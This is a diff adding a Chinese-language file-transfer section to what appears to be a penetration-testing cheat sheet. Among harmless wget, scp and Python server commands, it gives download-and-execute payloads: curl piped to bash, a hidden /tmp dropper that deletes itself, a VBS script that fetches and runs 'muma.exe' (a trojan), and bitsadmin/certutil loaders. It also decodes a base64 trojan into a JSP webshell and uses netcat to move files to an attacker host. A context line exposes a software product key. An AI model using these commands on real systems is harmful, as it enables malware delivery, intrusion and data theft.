@@ -170,6 +170,131 @@ Visual Studio Professional 2022 TD244-P4NB7-YQ6XK-Y8MMM-YWV2J
 ./gost -L=http2://:443 -L=socks5://:1080 -L=ss://aes-128-cfb:123456@:8338	//多端口监听
 nohup ./gost -L=:1080 > /dev/null 2>&1 &	//后台运行不记录日志
 ```
+# 文件传输
+```
+echo base64后的木马内容 |base64 -d > 360.jsp
+```
+### NC 文件传输
+
+```
+nc -l 23456 | tar xvzf - // 本地监听和接受文件
+tar cvzf - "文件名或者目录" | nc x.x.x.x 23456 // 压缩文件或目录传输
+或
+nc -l -p 4444 < /tool/file.exe	//本地发送
+nc $ATTACKER 4444 > file.exe	//远程接受
+```
+
+### Python启动文件下载服务
+
+```
+python2的用法如下:
+ 
+python -m SimpleHTTPServer
+
+python3的用法如下: 
+
+python3 -m http.server --cgi
+
+以上两种方法默认端口8000，可以制定端口，例如指定端口45678: 
+
+python -m SimpleHTTPServer 45678 
+
+python3 -m http.server --cgi 45678
+
+在命令的开头加一个nohup，忽略所有的挂断信号，如果当前bash关闭，则当前进程会挂载到init进程下，成为其子进程，这样即使退出当前用户，其45678端口也可以使用。
+
+nohup python -m SimpleHTTPServer 45678 &
+python -m pyftpdlib -p 2121	//开启简单ftp功能
+```
+### wget文件下载
+
+```
+wget http://soft.vpser.net/web/nginx/nginx-0.8.0.tar.gz	//文件下载
+wget -c http://soft.vpser.net/web/nginx/nginx-0.8.0.tar.gz	//断点续传
+wget -b http://soft.vpser.net/web/nginx/nginx-0.8.0.tar.gz	//后台下载
+wget -O /home/ http://soft.vpser.net/web/nginx/nginx-0.8.0.tar.gz	//文件另存为（文件名或路径）
+wget --http-user=youuser --http-passwd=youpassword http://soft.vpser.net/web/nginx/nginx-0.8.0.tar.gz	//基础认证
+wget --no-check-certificate https://soft.vpser.net/web/nginx/nginx-0.8.0.tar.gz	//https协议下载
+wget -c -r -np -k -L -p http://soft.vpser.net/web/	//全站web目录下载
+```
+### curl文件下载
+
+```
+curl -O https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz	//将文件保存到本地
+curl -k -O https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz	//下载https的网站将文件保存到本地
+curl -o ssocks.tar.gz https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz	//将文件保存到本地并保存为ssocks.tar.gz
+curl -C - https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz	//断点续传下载文件
+```
+### scp 远程文件/目录传输命令
+
+```
+scp -P 2222 root@www.vpser.net:/root/lnmp0.4.tar.gz /home/lnmp0.4.tar.gz	//获取远程服务器上的文件
+
+scp -P 2222 -r root@www.vpser.net:/root/lnmp0.4/ /home/lnmp0.4/	//获取远程服务器上的目录
+
+scp -P 2222 /home/lnmp0.4.tar.gz root@www.vpser.net:/root/lnmp0.4.tar.gz	//将本地文件上传到服务器上
+
+scp -P 2222 -r /home/lnmp0.4/ root@www.vpser.net:/root/lnmp0.4/	//将本地目录上传到服务器上
+
+端口P大写为参数，2222 表示更改SSH端口后的端口，如果没有更改SSH端口可以不用添加该参数。-r 参数表示递归复制（即复制该目录下面的文件和目录）
+
+root@www.vpser.net 表示使用root用户登录远程服务器www.vpser.net，:/root/lnmp0.4/ 表示远程服务器上的目录
+```
+### curl下载执行脚本
+下载执行
+```
+curl -A O -o- -L http://x.x.x.x/a | bash -s
+```
+脚本代码
+```
+mkdir /tmp/.qHFnC; rm -f /tmp/.qHFnC/uiRaBszrxF; curl -A O -L http://x.x.x.x/pKfsMhgjeh -o /tmp/.qHFnC/uiRaBszrxF; chmod 755 /tmp/.qHFnC/uiRaBszrxF; /tmp/.qHFnC/uiRaBszrxF; sleep 20; rm -rf /tmp/.qHFnC/uiRaBszrxF
+```
+### https://transfer.sh/ 文件传输
+```
+上传
+curl --upload-file 文件 https://transfer.sh/文件名
+curl --upload-file /root/hello.txt https://transfer.sh/hello.txt
+下载
+https://transfer.sh/get/1TghfFb/hello.txt
+```
+
+## Windows
+### ftp非交互上传文件脚本
+```
+ftp -i -n <<!
+open 10.x.x.x
+user yourFtpAccount yourPasswd
+cd /root/DailyBuild/webapps/
+delete xxx.war
+lcd /home/product/1.0.2-SNAPSHOT/webapps
+
+binary
+mput xxx.war
+bye
+!
+```
+### VBS下载
+```
+echo Set Post = CreateObject("Msxml2.XMLHTTP") >>zl.vbs
+echo Set Shell = CreateObject("Wscript.Shell") >>zl.vbs
+echo Post.Open "GET","http://x.x.x.x/muma.exe",0 >>zl.vbs
+echo Post.Send() >>zl.vbs
+echo Set aGet = CreateObject("ADODB.Stream") >>zl.vbs
+echo aGet.Mode = 3 >>zl.vbs
+echo aGet.Type = 1 >>zl.vbs
+echo aGet.Open() >>zl.vbs
+echo aGet.Write(Post.responseBody) >>zl.vbs
+echo aGet.SaveToFile "c:\zl.exe",2 >>zl.vbs
+echo wscript.sleep 1000 >>zl.vbs
+echo Shell.Run ("c:\zl.exe") >>zl.vbs
+```
+执行C:>`cscript zl.vbs`
+### 命令行下载执行
+```
+cmd.exe /c bitsadmin /transfer f370 http://x.x.x.x/as %APPDATA%\f370.exe&%APPDATA%\f370.exe&del %APPDATA%\f370.exe
+certutil.exe -urlcache -split -f https://x.x.x.x/version.txt   file.txt
+HH.exe http://x.x.x.x/test.exe c:\\test.exe	//适用于sqltools
+```
 # mysql
 ## mysqldump命令
 ```
